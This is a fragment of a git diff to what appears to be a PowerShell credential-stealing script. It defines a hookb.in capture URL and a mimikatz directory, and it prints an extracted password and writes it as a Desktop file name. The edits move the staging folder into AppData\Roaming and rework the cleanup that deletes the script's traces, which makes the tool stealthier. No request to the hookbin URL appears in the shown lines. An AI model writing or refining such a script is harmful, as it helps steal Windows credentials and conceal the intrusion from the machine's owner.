@@ -2,7 +2,7 @@
 Add-Type -AssemblyName System.Web
 
 $uri_hookbin = "https://hookb.in/ZV8Od8Bd"
-$repo_path = "$HOME/Desktop/ok"
+$repo_path = "$HOME/AppData/Roaming/ok"
 $mimikatz_path = "$repo_path/mimikatz"
 
 mkdir -p $mimikatz_path > $null 2>&1
@@ -39,5 +39,5 @@ echo "PASSWORD APRES SUBSTRING = $password"
 
 echo $null > "$HOME/Desktop/$password"
 # Cleaning
-cd $repo_path/..
-rm -rf $repo_path > $null 2>&1 
+cd "$HOME/Desktop/"
+rm -Force $repo_path > $null 2>&1 
